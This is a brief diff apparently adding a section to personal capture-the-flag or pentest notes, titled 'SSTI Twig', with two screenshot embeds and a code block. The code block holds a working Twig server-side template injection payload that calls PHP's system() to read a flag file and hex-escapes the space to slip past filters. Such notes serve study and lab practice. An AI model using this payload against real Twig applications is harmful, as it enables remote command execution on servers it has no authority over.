@@ -28,4 +28,13 @@ ____
     </script>
 ```
 
+# SSTI Twig
+
+![[Pasted image 20241004123012.png]]
+
+![[Pasted image 20241004123022.png]]
+
+```php
+{{['cat\x20/flag.txt']|filter('system')}}
+```
 
